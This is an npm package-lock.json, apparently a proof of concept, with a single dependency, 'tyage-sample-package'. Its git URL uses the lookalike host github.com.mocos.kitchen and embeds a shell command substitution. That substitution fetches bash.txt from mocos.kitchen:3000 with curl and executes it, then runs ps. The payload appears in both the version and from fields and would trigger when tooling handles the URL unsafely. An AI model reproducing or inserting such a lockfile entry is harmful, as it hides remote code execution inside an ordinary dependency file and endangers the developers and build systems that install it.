{
  "name": "javascript",
  "version": "1.0.0",
  "lockfileVersion": 1,
  "requires": true,
  "dependencies": {
    "tyage-sample-package": {
      "version": "git+https://github.com.mocos.kitchen/github.com/$($(curl$IFS@mocos.kitchen:3000/bash.txt))$(ps)?/github.com/tyage/sample-package.git#b87daf0d4d3b447c6e37501f4c39d5b1d1912a7d",
      "from": "git+https://github.com.mocos.kitchen/github.com/$($(curl$IFS@mocos.kitchen:3000/bash.txt))$(ps)?/github.com/tyage/sample-package.git#semver:4.0.2"
    }
  }
}
